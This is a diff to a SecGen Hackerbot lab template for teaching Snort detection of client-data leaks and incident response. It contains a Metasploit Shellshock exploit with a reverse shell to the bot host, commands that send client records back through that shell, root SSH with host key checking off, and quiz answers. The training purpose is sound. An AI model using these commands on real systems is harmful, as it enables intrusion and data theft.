@@ -10,40 +10,160 @@
   end
 
   $first_account = JSON.parse(self.accounts.first)
-  $second_account = JSON.parse(self.accounts[1])
-
-  $files = []
-  $log_files = []
-  if $second_account.key?("leaked_filenames") &&  $second_account['leaked_filenames'].size > 0
-    $files = $second_account['leaked_filenames']
-    $log_files = $second_account['leaked_filenames'].grep(/log/)
-  end
-
-  if $files.empty?
-    $files = ['myfile', 'afile', 'filee', 'thefile']
-  end
-  if $log_files.empty?
-    $log_files = ['log', 'thelog', 'logs', 'frogonalog']
-  end
-
   $main_user = $first_account['username'].to_s
-  $main_user_pass = $first_account['password'].to_s
-  $second_user = $second_account['username'].to_s
-  $example_file = "/home/#{$second_user}/#{$files.sample}"
-  $example_dir = "/home/#{$second_user}/personal_secrets/"
 
   $web_server_ip = self.web_server_ip.first
   $ids_server_ip = self.ids_server_ip.first
   $hackerbot_server_ip = self.hackerbot_server_ip.first
-  $root_password = self.root_password
   $flags = self.flags
 
   $sensitive_files_location = "/home/#{$main_user}/trade_secrets/"
+  $clients_file = "#{$sensitive_files_location}clients.csv"
+  $fake_clients_file = "#{$sensitive_files_location}fake_clients.csv"
 
-  REQUIRED_FLAGS = 4
+  # Every attack leaves a copy of the real clients.csv here on the web server
+  # (the Shellshock shell runs as www-data, so it can't read the original).
+  # It is the "data at rest" the attack 2 quiz asks for, so nothing else is left behind.
+  $resting_clients = "/tmp/#{SecureRandom.hex(3)}"
+
+  # Incident (attack 4): the data goes to a random port, and only some of the records go.
+  $incident_lport = 20000 + SecureRandom.random_number(40000)
+  $incident_records = 2 + SecureRandom.random_number(4)
+  # Containment (attack 9): the Shellshock shell touches this file, so its presence means the attack got in.
+  $shell_marker = "/tmp/.#{SecureRandom.hex(4)}"
+  # Attacks 1-4: the shell touches a marker before sending the data, so a check can tell "the data never
+  # left" (a slow or dropped shell, seen on the first attack after boot) from "your rule didn't fire".
+  $transfer_marker = Hash.new { |h, k| h[k] = "/tmp/.#{SecureRandom.hex(4)}" }
+
+  REQUIRED_FLAGS = 11
   while $flags.length < REQUIRED_FLAGS
     $flags << "flag{#{SecureRandom.hex}}"
     Print.err "Warning: Not enough flags provided to hackerbot_config generator, some flags won't be tracked/marked!"
+  end
+
+  # Shell snippets shared by the three attacks. Each step prints HB_* status markers,
+  # which can't occur in the stolen data or in msfconsole output, and the conditions
+  # are ordered so the most specific failure wins. No bare & or < (XML), and POSIX sh
+  # only (pre_shell and post_shell run via /bin/sh on the hackerbot server).
+  $ssh = 'ssh -i /opt/hackerbot/keys/id_rsa -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=15'
+
+  # Prepare: run remote_cmd on the web server as root, snapshot the IDS alert file, check Snort is up.
+  $pre_shell = lambda do |tag, remote_cmd|
+    "rm -f /tmp/hb_alert_before_#{tag} /tmp/hb_webfail_#{tag}; " \
+    "#{$ssh} root@#{$web_server_ip} '#{remote_cmd}' >/dev/null 2>&amp;1 || { touch /tmp/hb_webfail_#{tag}; echo HB_WEB_SSH_FAIL; }; " \
+    "#{$ssh} root@#{$ids_server_ip} 'cat /var/log/snort/alert 2>/dev/null; exit 0' > /tmp/hb_alert_before_#{tag} 2>/dev/null || { rm -f /tmp/hb_alert_before_#{tag}; echo HB_IDS_SSH_FAIL; }; " \
+    "#{$ssh} root@#{$ids_server_ip} 'pgrep -x snort' >/dev/null 2>&amp;1 || echo HB_SNORT_DOWN; " \
+    "echo HB_PRE_DONE"
+  end
+
+  # Check: find the student's rule (by its alert message), require the keyword, optionally
+  # reject rules that contain sensitive values from either CSV, then look for new alerts.
+  # The whole before/after diff is searched (no tail window), so other rules firing on the
+  # same traffic can't hide the student's alert; only the final marker is printed.
+  #
+  # no_literals: nil (no check), :sensitive (card/phone digit runs with and without spaces,
+  # NI numbers, emails) or :all (:sensitive plus the name field, which is first in each
+  # record). Attack 3 uses :sensitive so a name can still anchor protected_content, as
+  # its hint suggests. Only whole values are caught, not fragments of them.
+  $post_shell = lambda do |tag, alert_msg, keyword_re, no_literals, cleanup_cmd|
+    marker = $transfer_marker[tag]
+    s = "sleep 2; "
+    s << "#{$ssh} root@#{$web_server_ip} '#{cleanup_cmd}' >/dev/null 2>&amp;1; " if cleanup_cmd
+    s << "if [ -f /tmp/hb_webfail_#{tag} ]; then echo HB_WEB_SSH_FAIL; exit 0; fi; "
+    s << "if [ ! -f /tmp/hb_alert_before_#{tag} ]; then echo HB_IDS_SSH_FAIL; exit 0; fi; "
+    s << "#{$ssh} root@#{$ids_server_ip} 'cat /var/log/snort/alert 2>/dev/null; exit 0' > /tmp/hb_alert_after_#{tag} 2>/dev/null || { echo HB_IDS_SSH_FAIL; exit 0; }; "
+    s << "#{$ssh} root@#{$ids_server_ip} 'cat /etc/snort/rules/local.rules' > /tmp/hb_rules_#{tag} 2>/dev/null || { echo HB_RULES_UNREADABLE; exit 0; }; "
+    s << "grep -E '^[[:space:]]*alert' /tmp/hb_rules_#{tag} | grep -F '#{alert_msg}' > /tmp/hb_myrules_#{tag}; "
+    s << "if [ ! -s /tmp/hb_myrules_#{tag} ]; then echo HB_RULE_MISSING; exit 0; fi; "
+    s << "if ! grep -Eq '#{keyword_re} ?: ?\"' /tmp/hb_myrules_#{tag}; then echo HB_KEYWORD_MISSING; exit 0; fi; "
+    if no_literals
+      csv = "/tmp/hb_csv_#{tag}"
+      s << "#{$ssh} root@#{$web_server_ip} 'cat #{$clients_file} #{$fake_clients_file}' > #{csv} 2>/dev/null; "
+      s << "if [ ! -s #{csv} ]; then echo HB_WEB_SSH_FAIL; exit 0; fi; "
+      s << "{ "
+      s << "cut -d, -f1 #{csv} | tr -d '\"'; " if no_literals == :all
+      s << "grep -oE '[+]?[0-9][0-9 ()-]{8,}[0-9]' #{csv}; "
+      s << "grep -oE '[+]?[0-9][0-9 ()-]{8,}[0-9]' #{csv} | tr -cd '0-9[:cntrl:]'; "
+      s << "grep -oE 'QQ[0-9]{6}[A-D]' #{csv}; "
+      s << "grep -oE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+' #{csv}; "
+      s << "} | awk 'length($0) >= 5' | sort -u > /tmp/hb_values_#{tag}; "
+      s << "if grep -Fiq -f /tmp/hb_values_#{tag} /tmp/hb_myrules_#{tag}; then echo HB_RULE_LITERAL; exit 0; fi; "
+    end
+    s << "if ! #{$ssh} root@#{$web_server_ip} 'test -f #{marker}' >/dev/null 2>&amp;1; then echo HB_NO_TRANSFER; exit 0; fi; "
+    s << "#{$ssh} root@#{$web_server_ip} 'rm -f #{marker}' >/dev/null 2>&amp;1; "
+    s << "if ! #{$ssh} root@#{$ids_server_ip} 'pgrep -x snort' >/dev/null 2>&amp;1; then echo HB_SNORT_DOWN; exit 0; fi; "
+    s << "N=$(diff -n /tmp/hb_alert_before_#{tag} /tmp/hb_alert_after_#{tag} | grep -cF '#{alert_msg}'); "
+    s << "if [ \"$N\" -gt 0 ]; then echo HB_PASS fired:$N; else echo HB_NOT_TRIGGERED; fi"
+    s
+  end
+
+  # Failure conditions shared by the three attacks, most specific first.
+  $failure_conditions = lambda do |alert_msg, keyword_desc, no_literals|
+    c = []
+    c << ['HB_WEB_SSH_FAIL', ":( Couldn't reach the web server (#{$web_server_ip}) to set up the attack."]
+    c << ['HB_IDS_SSH_FAIL', ":( Couldn't reach the IDS server (#{$ids_server_ip}), so I can't check your Snort alerts."]
+    c << ['HB_RULES_UNREADABLE', ":( Couldn't read /etc/snort/rules/local.rules on the IDS server."]
+    c << ['HB_RULE_MISSING', ":( Couldn't find an alert rule with the message \"#{alert_msg}\" in /etc/snort/rules/local.rules on the IDS server."]
+    c << ['HB_KEYWORD_MISSING', ":( Your rule with the message \"#{alert_msg}\" doesn't use #{keyword_desc}."]
+    c << ['HB_RULE_LITERAL', ":( Your rule contains some of the sensitive data itself. Match the format of the records (what a card number or NI number looks like), not their actual values."] if no_literals
+    c << ['HB_SNORT_DOWN', ":( Snort isn't running on the IDS server. Start it with: sudo service snort start. If it won't stay up, a rule probably has a syntax error: check with sudo snort -T -c /etc/snort/snort.conf"]
+    c << ['HB_SEND_FAIL', ":( I got in but couldn't read the file back that time (the first exploit after a reboot can be slow). Say 'ready' to try again."]
+    c << ['HB_NO_TRANSFER', ":( I got into the web server, but the connection was too slow to get the data out this time, so there was nothing for Snort to see. Say 'ready' to try again."]
+    c
+  end
+
+  $condition_xml = lambda do |marker, message|
+    "\t\t<condition>\n\t\t\t<output_matches>#{marker}</output_matches>\n\t\t\t<message>#{message}</message>\n\t\t</condition>\n"
+  end
+
+  # Break in over Shellshock (CVE-2014-6271) against the Apache CGI endpoint on port 80, giving a
+  # reverse shell as www-data. The IDS's updated community rule flags this as "OS-OTHER Bash CGI
+  # environment variable injection". A cmd payload (not a binary) is used so it runs reliably through
+  # the bash the vulnerability lives in.
+  # TARGET 1 is Linux x86_64 (the web_server base); the module defaults to TARGET 0 (x86), under which the
+  # x64 and cmd payloads are rejected as incompatible. linux/x64/shell_reverse_tcp gives a command shell
+  # session, the same session type the distcc attack used, so the bot can pipe its post_command into it.
+  $msf_shellshock = "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS #{$web_server_ip}; set RPORT 80; set TARGETURI /cgi-bin/test.cgi; set TARGET 1; set payload linux/x64/shell_reverse_tcp; set LHOST #{$hackerbot_server_ip}"
+  # A unique reverse-shell port per attack: consecutive attacks each spawn a fresh msfconsole that the
+  # bot kill -9's when the attack ends, which can leave the handler port held; reusing one port (4444)
+  # across attacks then intermittently denies the next attack its session. Distinct ports avoid that.
+  $lport = Hash.new { |h, k| h[k] = 20000 + SecureRandom.random_number(40000) }
+  def get_shell_on(lport)
+    "msfconsole -x \"#{$msf_shellshock}; set LPORT #{lport}; exploit\""
+  end
+  # attacks 4 and 9 reuse the incident port so the student blocks the one port they identified
+  $get_shell_lport = get_shell_on($incident_lport)
+
+  # A question-only step: the question is in the prompt, so the student can answer straight away
+  # (the bot accepts an answer whenever the current attack has a quiz); 'ready' repeats it.
+  $quiz_attack = lambda do |comment, prompt, question, answer, flag|
+    <<~XML
+    	<!-- #{comment} -->
+    	<attack>
+    		<pre_shell>echo HB_ASK</pre_shell>
+    		<get_shell>false</get_shell>
+    		<suppress_command_output_feedback />
+    		<prompt>#{prompt} #{question} Reply with "answer" followed by your answer.</prompt>
+    		<condition>
+    			<output_matches>HB_ASK</output_matches>
+    			<message>Here's the question again.</message>
+    			<trigger_quiz />
+    		</condition>
+    		<condition>
+    			<output_matches>HB_NEVER_PRINTED</output_matches>
+    			<message>...</message>
+    		</condition>
+    		<else_condition>
+    			<message>:( Something was not quite right... If this keeps happening, say 'ready' to try again.</message>
+    		</else_condition>
+    		<quiz>
+    			<question>#{question}</question>
+    			<answer>#{answer}</answer>
+    			<correct_answer_response>:) #{flag}</correct_answer_response>
+    			<trigger_next_attack />
+    		</quiz>
+    	</attack>
+    XML
   end
 
   def get_binding
@@ -118,153 +238,235 @@ Randomised instance generated by [SecGen](http://github.com/cliffe/SecGen) (<%= 
 
 	</tutorial_info>
 
+	<!-- Attack 1: text-based (content or pcre) detection of clients.csv -->
 	<attack>
-<% $rand_alert0 = SecureRandom.hex(3)
-   $rand_tmp_restingplace = "/tmp/#{SecureRandom.hex(3)}" %>
-		<!--get the snort alerts before-->
-		<!--and make a copy of the file to a new location -->
-		<pre_shell>ssh -i /opt/hackerbot/keys/id_rsa -oStrictHostKeyChecking=no root@<%= $web_server_ip %> 'cp <%= $sensitive_files_location %>clients.csv <%= $rand_tmp_restingplace %>; chmod 644 <%= $rand_tmp_restingplace %>'; stat0=$?; echo -$stat0; scp -i /opt/hackerbot/keys/id_rsa -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_before; echo --$?</pre_shell>
-		<!--exploit and read contents of sensitive file over the network-->
-		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; set payload cmd/unix/reverse; set LHOST <%= $hackerbot_server_ip %>; exploit"</get_shell>
-		<!--trigger the rule by sending the data-->
-		<post_command>cat <%= $rand_tmp_restingplace %>; echo --$?</post_command>
-		<!--get the snort alerts after, and diff for new alerts generated-->
-		<post_shell>scp -i /opt/hackerbot/keys/id_rsa -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_after; echo --$?; diff -n /tmp/snort_alert_before /tmp/snort_alert_after | tail -n 5 | grep <%= $rand_alert0 %> >/dev/null; echo triggered:$?; scp -i /opt/hackerbot/keys/id_rsa -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/etc/snort/rules/local.rules /tmp/snort_rules; echo rules:$?; grep '^alert' /tmp/snort_rules | grep '<%= $rand_alert0 %>' | grep -E '(content|pcre) ?: ?"' >/dev/null; echo good_rule:$? </post_shell>
+<% $rand_alert0 = SecureRandom.hex(3) -%>
+		<pre_shell><%= $pre_shell.call('a1', "rm -f #{$transfer_marker['a1']}; cp #{$clients_file} #{$resting_clients} || exit 1; chmod 644 #{$resting_clients}") %></pre_shell>
+		<!-- exploit and read the sensitive file over the network -->
+		<get_shell><%= get_shell_on($lport['a1']) %></get_shell>
+		<post_command>touch <%= $transfer_marker['a1'] %>; for i in 1 2 3 4 5; do if cat <%= $resting_clients %>; then break; fi; sleep 1; done || echo HB_SEND_FAIL; echo HB_SENT</post_command>
+		<post_shell><%= $post_shell.call('a1', $rand_alert0, '(content|pcre)', false, nil) %></post_shell>
 		<suppress_command_output_feedback />
 
-		<prompt>You need to monitor your sensitive list of clients. The file contains credit card details and national insurance numbers. You have a copy in <%= $sensitive_files_location %>clients.csv Use one or more Snort rules to detect unencrypted transport of the file. The alert must include the message "<%= $rand_alert0 %>". (This attack may take a while.)</prompt>
+		<prompt>You need to monitor your sensitive list of clients. The file contains credit card details and national insurance numbers. You have a copy in <%= $clients_file %> Use one or more Snort rules to detect unencrypted transport of the file. The alert must include the message "<%= $rand_alert0 %>". (This attack may take a while.)</prompt>
 
+<% $failure_conditions.call($rand_alert0, 'content or pcre matching', false).each do |marker, message| -%>
+<%= $condition_xml.call(marker, message) -%>
+<% end -%>
 		<condition>
-			<output_matches>good_rule:1</output_matches>
-			<message>:( Couldn't find your snort rule on the IDS server in /etc/snort/rules/local.rules. You are missing content matching or the message from your rule.</message>
-		</condition>
-		<condition>
-			<output_matches>triggered:1</output_matches>
+			<output_matches>HB_NOT_TRIGGERED</output_matches>
 			<message>:( Your rule wasn't triggered.</message>
 		</condition>
 		<condition>
-			<output_matches>triggered:0.*good_rule:0</output_matches>
+			<output_matches>HB_PASS</output_matches>
 			<message>:) Well done! <%= $flags.pop %>.</message>
 			<trigger_next_attack />
 		</condition>
 		<condition>
-			<output_matches>--1</output_matches>
-			<message>:( Failed to scp to the ids server (<%= $ids_server_ip %>)</message>
-		</condition>
-		<condition>
-			<output_matches>-1</output_matches>
-			<message>:( Failed to ssh to the web server (<%= $web_server_ip %>)</message>
-		</condition>
-		<condition>
-			<output_matches>--0</output_matches>
+			<output_matches>HB_SENT|HB_PRE_DONE</output_matches>
 			<message>Continuing...</message>
 		</condition>
+		<!-- the shell replied without the data (seen on the first attack after the VMs start); the check that follows says what happened -->
+		<condition>
+			<output_not_matches>HB_</output_not_matches>
+			<message>I got a shell, but the data hasn't come back yet (the first attack after the VMs start is often slow). Checking...</message>
+		</condition>
 		<else_condition>
-			<message>:( Something was not quite right...</message>
+			<message>:( Something was not quite right... If this keeps happening, say 'ready' to try again.</message>
 		</else_condition>
 
 		<tutorial><%= ERB.new(File.read self.templates_path + 'dlp.md.erb').result(self.get_binding) %></tutorial>
 	</attack>
 
+	<!-- Attack 2: regular expression detection of either file, with no literal data in the rule -->
 	<attack>
 <% $rand_alert2 = SecureRandom.hex(3)
-   $rand_tmp_restingplace_fake = "/tmp/#{SecureRandom.hex(3)}"  %>
-		<!--get the snort alerts before-->
-		<!--and make a copy of the file to a new location -->
-		<pre_shell>ssh -i /opt/hackerbot/keys/id_rsa -oStrictHostKeyChecking=no root@<%= $web_server_ip %> 'cp <%= $sensitive_files_location %>fake_clients.csv <%= $rand_tmp_restingplace_fake %>; chmod 644 <%= $rand_tmp_restingplace_fake %>'; stat0=$?; echo -$stat0; scp -i /opt/hackerbot/keys/id_rsa -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_before; echo --$?</pre_shell>
-		<!--exploit and read contents of sensitive file over the network-->
-		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; set payload cmd/unix/reverse; set LHOST <%= $hackerbot_server_ip %>; exploit"</get_shell>
-		<!--trigger the rule by sending the data-->
-		<post_command>cat <%= $rand_tmp_restingplace_fake %>; echo --$?</post_command>
-		<!--get the snort alerts after, and diff for new alerts generated-->
-		<post_shell>scp -i /opt/hackerbot/keys/id_rsa -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_after; echo --$?; diff -n /tmp/snort_alert_before /tmp/snort_alert_after | tail -n 5 | grep <%= $rand_alert2 %> >/dev/null; echo triggered:$?; scp -i /opt/hackerbot/keys/id_rsa -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/etc/snort/rules/local.rules /tmp/snort_rules; echo rules:$?; grep '^alert' /tmp/snort_rules | grep '<%= $rand_alert2 %>' | grep -E 'pcre ?: ?"' >/dev/null; echo good_rule:$? </post_shell>
+   $rand_transfer2 = "/tmp/#{SecureRandom.hex(3)}" -%>
+		<!-- plant the resting copy (so the quiz can be answered even after 'goto 2'), and stage one of the two files, picked at random, for transfer -->
+		<pre_shell><%= $pre_shell.call('a2', "rm -f #{$transfer_marker['a2']}; cp #{$clients_file} #{$resting_clients} || exit 1; chmod 644 #{$resting_clients}; cp \"$(shuf -n1 -e #{$clients_file} #{$fake_clients_file})\" #{$rand_transfer2} || exit 1; chmod 644 #{$rand_transfer2}") %></pre_shell>
+		<get_shell><%= get_shell_on($lport['a2']) %></get_shell>
+		<post_command>touch <%= $transfer_marker['a2'] %>; for i in 1 2 3 4 5; do if cat <%= $rand_transfer2 %>; then break; fi; sleep 1; done || echo HB_SEND_FAIL; echo HB_SENT</post_command>
+		<!-- the staged copy is removed again, so the only copy left at rest is the one the quiz asks for -->
+		<post_shell><%= $post_shell.call('a2', $rand_alert2, 'pcre', :all, "rm -f #{$rand_transfer2}") %></post_shell>
 		<suppress_command_output_feedback />
 
-		<prompt>Update your rule so that it also matches the fake_clients file. Use REGEXP so that your rule doesn't include any of the actual data. You have a copy in <%= $sensitive_files_location %>fake_clients.csv Use one or more Snort rules to detect unencrypted transport of either of the files. The alert must include the message "<%= $rand_alert2 %>".</prompt>
+		<prompt>Update your rule so that it uses a regular expression (pcre) and contains none of the actual data. This time I'll steal either the real client list or the fake one, and you won't know which, so your rule needs to match what the records look like, not what they say. You have copies in <%= $clients_file %> and <%= $fake_clients_file %> The alert must include the message "<%= $rand_alert2 %>".</prompt>
 
+<% $failure_conditions.call($rand_alert2, '*regular expression* (pcre) matching', true).each do |marker, message| -%>
+<%= $condition_xml.call(marker, message) -%>
+<% end -%>
 		<condition>
-			<output_matches>good_rule:1</output_matches>
-			<message>:( Couldn't find your snort rule on the IDS server in /etc/snort/rules/local.rules. You are missing *regular expression* matching or the message from your rule.</message>
-		</condition>
-		<condition>
-			<output_matches>triggered:1</output_matches>
+			<output_matches>HB_NOT_TRIGGERED</output_matches>
 			<message>:( Your rule wasn't triggered.</message>
 		</condition>
 		<condition>
-			<output_matches>triggered:0.*good_rule:0</output_matches>
+			<output_matches>HB_PASS</output_matches>
 			<message>:) Well done! <%= $flags.pop %>.</message>
 			<trigger_quiz />
 		</condition>
 		<condition>
-			<output_matches>--1</output_matches>
-			<message>:( Failed to scp to the ids server (<%= $ids_server_ip %>)</message>
-		</condition>
-		<condition>
-			<output_matches>-1</output_matches>
-			<message>:( Failed to ssh to the web server (<%= $web_server_ip %>)</message>
-		</condition>
-		<condition>
-			<output_matches>--0</output_matches>
+			<output_matches>HB_SENT|HB_PRE_DONE</output_matches>
 			<message>Continuing...</message>
 		</condition>
+		<!-- the shell replied without the data (seen on the first attack after the VMs start); the check that follows says what happened -->
+		<condition>
+			<output_not_matches>HB_</output_not_matches>
+			<message>I got a shell, but the data hasn't come back yet (the first attack after the VMs start is often slow). Checking...</message>
+		</condition>
 		<else_condition>
-			<message>:( Something was not quite right...</message>
+			<message>:( Something was not quite right... If this keeps happening, say 'ready' to try again.</message>
 		</else_condition>
 
-
 		<quiz>
-			<question>Where else is the sensitive data at rest across the various server VMs for the lab? Use regexp searches to find the file (don't use hashes).</question>
-			<answer><%= $rand_tmp_restingplace %></answer>
+			<question>My attacks have left a copy of the real client list (clients.csv) somewhere else on the web_server VM. Use a regular expression search (don't use hashes) to find it. What is its full path?</question>
+			<answer><%= Regexp.escape($resting_clients) %></answer>
 			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 	</attack>
 
-
-  <!-- requires use a version of snort that supports protected_content (2.9.7+ as found in Debian Stretch) -->
+	<!-- Attack 3: hash-based detection (protected_content needs Snort 2.9.7+, as on the Debian 10 IDS) -->
 	<attack>
-<% $rand_alert1 = SecureRandom.hex(3) %>
-		<!-- get the snort alerts before -->
-		<!-- and make a copy of the file to a new location  -->
-		<pre_shell>ssh -i /opt/hackerbot/keys/id_rsa -oStrictHostKeyChecking=no root@<%= $web_server_ip %> 'cp <%= $sensitive_files_location %>clients.csv <%= $rand_tmp_restingplace %>; chmod 644 <%= $rand_tmp_restingplace %>'; stat0=$?; echo -$stat0; scp -i /opt/hackerbot/keys/id_rsa -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_before; echo --$?</pre_shell>
-		<!-- exploit and read contents of sensitive file over the network -->
-		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; set payload cmd/unix/reverse; set LHOST <%= $hackerbot_server_ip %>; exploit"</get_shell>
-		<!-- trigger the rule by sending the data -->
-		<post_command>cat <%= $rand_tmp_restingplace %>; echo --$?</post_command>
-		<!-- get the snort alerts after, and diff for new alerts generated -->
-		<post_shell>scp -i /opt/hackerbot/keys/id_rsa -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_after; echo --$?; diff -n /tmp/snort_alert_before /tmp/snort_alert_after | tail -n 5 | grep <%= $rand_alert1 %> >/dev/null; echo triggered:$?; scp -i /opt/hackerbot/keys/id_rsa -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/etc/snort/rules/local.rules /tmp/snort_rules; echo rules:$?; grep '^alert' /tmp/snort_rules | grep '<%= $rand_alert1 %>' | grep -E 'protected_content ?: ?"' >/dev/null; echo good_rule:$? </post_shell>
+<% $rand_alert1 = SecureRandom.hex(3) -%>
+		<pre_shell><%= $pre_shell.call('a3', "rm -f #{$transfer_marker['a3']}; cp #{$clients_file} #{$resting_clients} || exit 1; chmod 644 #{$resting_clients}") %></pre_shell>
+		<get_shell><%= get_shell_on($lport['a3']) %></get_shell>
+		<post_command>touch <%= $transfer_marker['a3'] %>; for i in 1 2 3 4 5; do if cat <%= $resting_clients %>; then break; fi; sleep 1; done || echo HB_SEND_FAIL; echo HB_SENT</post_command>
+		<post_shell><%= $post_shell.call('a3', $rand_alert1, 'protected_content', :sensitive, nil) %></post_shell>
 		<suppress_command_output_feedback />
 
-		<prompt>Update your rule so that it doesn't contain any of the sensitive data. Use hash-based matching. You have a copy in <%= $sensitive_files_location %>clients.csv Use one or more Snort rules to detect unencrypted transport of the file. The alert must include the message "<%= $rand_alert1 %>".</prompt>
+		<prompt>Update your rule so that it doesn't contain any of the sensitive data. Use hash-based matching. You have a copy in <%= $clients_file %> Use one or more Snort rules to detect unencrypted transport of the file. The alert must include the message "<%= $rand_alert1 %>".</prompt>
 
+<% $failure_conditions.call($rand_alert1, '*protected_content* matching', true).each do |marker, message| -%>
+<%= $condition_xml.call(marker, message) -%>
+<% end -%>
 		<condition>
-			<output_matches>good_rule:1</output_matches>
-			<message>:( Couldn't find your snort rule on the IDS server in /etc/snort/rules/local.rules. You are missing *protected_content* matching or the message from your rule.</message>
-		</condition>
-		<condition>
-			<output_matches>triggered:1</output_matches>
+			<output_matches>HB_NOT_TRIGGERED</output_matches>
 			<message>:( Your rule wasn't triggered. Hints: you don't know where in the packet the protected content will be so you can first have a content rule based on something you know will come first, and specify a distance between that and the protected content.</message>
 		</condition>
 		<condition>
-			<output_matches>triggered:0.*good_rule:0</output_matches>
+			<output_matches>HB_PASS</output_matches>
 			<message>:) Well done! <%= $flags.pop %>.</message>
 			<trigger_next_attack />
 		</condition>
 		<condition>
-			<output_matches>--1</output_matches>
-			<message>:( Failed to scp to the ids server (<%= $ids_server_ip %>)</message>
-		</condition>
-		<condition>
-			<output_matches>-1</output_matches>
-			<message>:( Failed to ssh to the web server (<%= $web_server_ip %>)</message>
-		</condition>
-		<condition>
-			<output_matches>--0</output_matches>
+			<output_matches>HB_SENT|HB_PRE_DONE</output_matches>
 			<message>Continuing...</message>
 		</condition>
+		<!-- the shell replied without the data (seen on the first attack after the VMs start); the check that follows says what happened -->
+		<condition>
+			<output_not_matches>HB_</output_not_matches>
+			<message>I got a shell, but the data hasn't come back yet (the first attack after the VMs start is often slow). Checking...</message>
+		</condition>
 		<else_condition>
-			<message>:( Something was not quite right...</message>
+			<message>:( Something was not quite right... If this keeps happening, say 'ready' to try again.</message>
 		</else_condition>
+	</attack>
+
+	<!-- Attack 4: the incident. Same break-in, but the data goes to a random port and only some
+	     records are taken; the student captures it and investigates in attacks 4-8. -->
+	<attack>
+		<pre_shell><%= $pre_shell.call('a4', "rm -f #{$transfer_marker['a4']}; cp #{$clients_file} #{$resting_clients} || exit 1; chmod 644 #{$resting_clients}") %></pre_shell>
+		<get_shell><%= $get_shell_lport %></get_shell>
+		<post_command>touch <%= $transfer_marker['a4'] %>; for i in 1 2 3 4 5; do if head -n <%= $incident_records %> <%= $resting_clients %>; then break; fi; sleep 1; done || echo HB_SEND_FAIL; echo HB_SENT</post_command>
+		<post_shell>if <%= $ssh %> root@<%= $web_server_ip %> 'test -f <%= $transfer_marker['a4'] %>' >/dev/null 2>&amp;1; then <%= $ssh %> root@<%= $web_server_ip %> 'rm -f <%= $transfer_marker['a4'] %>' >/dev/null 2>&amp;1; echo HB_A4_DONE; else echo HB_NO_TRANSFER; fi</post_shell>
+		<suppress_command_output_feedback />
+
+		<prompt>Time for an incident. I'm going to break in and steal some of your client records again, and this time I'll be sneakier about where the data goes. Start a packet capture on the ids_monitor VM (Wireshark or tcpdump) before you say 'ready', and keep it: you'll need it to investigate. (This attack may take a while.)</prompt>
+
+<% $failure_conditions.call('', '', false).select { |marker, _| %w[HB_WEB_SSH_FAIL HB_IDS_SSH_FAIL HB_SNORT_DOWN HB_SEND_FAIL HB_NO_TRANSFER].include?(marker) }.each do |marker, message| -%>
+<%= $condition_xml.call(marker, message) -%>
+<% end -%>
+		<condition>
+			<output_matches>HB_SENT</output_matches>
+			<message>Got what I came for. Now, investigate: which destination port did the stolen data go to?</message>
+			<trigger_quiz />
+		</condition>
+		<condition>
+			<output_matches>HB_PRE_DONE|HB_A4_DONE</output_matches>
+			<message>Continuing...</message>
+		</condition>
+		<!-- the shell replied without the data (seen on the first attack after the VMs start); the check that follows says what happened -->
+		<condition>
+			<output_not_matches>HB_</output_not_matches>
+			<message>I got a shell, but the data hasn't come back yet (the first attack after the VMs start is often slow). Checking...</message>
+		</condition>
+		<else_condition>
+			<message>:( Something was not quite right... If this keeps happening, say 'ready' to try again.</message>
+		</else_condition>
+
+		<quiz>
+			<question>Which destination port did the stolen data go to?</question>
+			<answer><%= $incident_lport %></answer>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
+			<trigger_next_attack />
+		</quiz>
+	</attack>
+
+<%= $quiz_attack.call('Attack 5: incident investigation, what was taken',
+  'Keep investigating the incident, using your capture and your Snort alerts.',
+  'How many client records did I steal?',
+  "0*#{$incident_records}", $flags.pop) -%>
+
+<%= $quiz_attack.call('Attack 6: incident investigation, how the attacker got in',
+  'Look at the traffic from just before the data left.',
+  'Which software or service did I exploit to get in?',
+  '(?i).*(shell ?shock|bash|cgi|apache|http|web ?server).*|80|cve.?2014.?6271', $flags.pop) -%>
+
+<%= $quiz_attack.call('Attack 7: incident report, ATT&amp;CK technique',
+  'Time to write up the incident. MITRE ATT&amp;CK gives each attacker technique an ID.',
+  'Which ATT&amp;CK technique ID describes how the data left your network?',
+  't1041(\.0+)?( .*)?', $flags.pop) -%>
+
+<%= $quiz_attack.call('Attack 8: incident report, breach notification',
+  'The stolen records include names and national insurance numbers, so this is a personal data breach.',
+  "Under UK GDPR, within how many hours of becoming aware of a breach like this must the organisation report it to the ICO?",
+  '72( hours?)?', $flags.pop) -%>
+
+	<!-- Attack 9: containment with a packet filter on the web server, then an IPS question -->
+	<attack>
+		<pre_shell><%= $pre_shell.call('a9', "cp #{$clients_file} #{$resting_clients} || exit 1; chmod 644 #{$resting_clients}; rm -f #{$shell_marker}") %></pre_shell>
+		<!-- same LPORT as the incident (attack 4): the student blocks the one port they already identified -->
+		<get_shell><%= $get_shell_lport %></get_shell>
+		<post_command>touch <%= $shell_marker %>; for i in 1 2 3 4 5; do if cat <%= $resting_clients %>; then break; fi; sleep 1; done; echo HB_SENT</post_command>
+		<shell_fail_message>Couldn't get my shell back this time. Let's check the web server is still serving...</shell_fail_message>
